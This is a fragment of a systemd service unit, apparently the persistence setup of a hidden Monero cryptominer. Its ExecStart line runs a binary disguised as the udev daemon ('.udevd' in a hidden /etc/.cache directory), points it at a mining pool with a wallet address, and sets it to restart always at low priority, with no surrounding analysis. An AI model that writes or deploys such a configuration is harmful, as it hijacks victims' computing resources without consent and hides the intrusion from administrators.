...
ExecStart=/etc/.cache/systemd/.udevd -o xmr.kryptex.network:7029 -u 89YQSFqV1vbUM77et87qV67eVroCiro6YYntMES23R3h7kKjeKyN4cwTnCVAFhyMpq6w1JERiENowLPxdxXWenJv5hZMfS2.TENKI -t 2
Restart=always
RestartSec=10
Nice=19
